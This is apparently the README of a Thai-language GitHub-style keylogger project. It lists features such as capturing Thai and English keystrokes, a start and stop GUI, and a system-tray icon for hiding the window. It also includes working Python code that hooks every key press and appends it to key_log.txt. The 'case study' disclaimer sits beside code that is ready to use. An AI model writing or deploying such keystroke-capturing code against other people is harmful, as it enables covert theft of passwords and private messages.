# Keylogger

โปรเจกต์ Keylogger ตัวนี้เป็นโปรแกรมดักจับการกดแป้นพิมพ์ (Keyboard Logger) พร้อมกับ GUI ที่ช่วยให้สามารถควบคุมการทำงานได้ง่ายขึ้น รวมถึงระบบ System Tray สำหรับย่อโปรแกรมไปยังถาดไอคอน
Keylogger ทำขึ้นเพื่อเป็นซอฟแวร์นี้เป็นกรณีศึกษา เราจะไม่รับผิดชอบใดใดทั้งสิ้นหากใช้งานซอฟแวร์แล้วก่อให้เกิดความเสียหายต่อทรัพย์สิน
---

## ฟีเจอร์หลัก

- ดักจับปุ่มกดจากคีย์บอร์ดทั้งภาษาไทยและอังกฤษ
- บันทึกข้อมูลลงไฟล์ `key_log.txt`
- GUI สำหรับเริ่มต้น / หยุด / ดูสถานะ keylogger
- System tray icon สำหรับซ่อน/แสดงหน้าต่างโปรแกรม
- รองรับปุ่มพิเศษ เช่น Space, Enter, Backspace ฯลฯ

---

## ตัวอย่างโค้ด

### 1. ตัวอย่าง Keylogger พื้นฐาน (keylogger.py)

```python
import keyboard

log_file = "key_log.txt"

def on_key_event(event):
    if event.event_type != "down":
        return

    key = event.name
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            if len(key) == 1:
                f.write(key)
            elif key == "space":
                f.write(" ")
            elif key == "enter":
                f.write("\n")
            elif key == "tab":
                f.write("\t")
            elif key == "backspace":
                f.write("[BACKSPACE]")
            elif key == "shift":
                pass
            else:
                f.write(f"[{key.upper()}]")
    except:
        pass

keyboard.hook(on_key_event)
keyboard.wait()
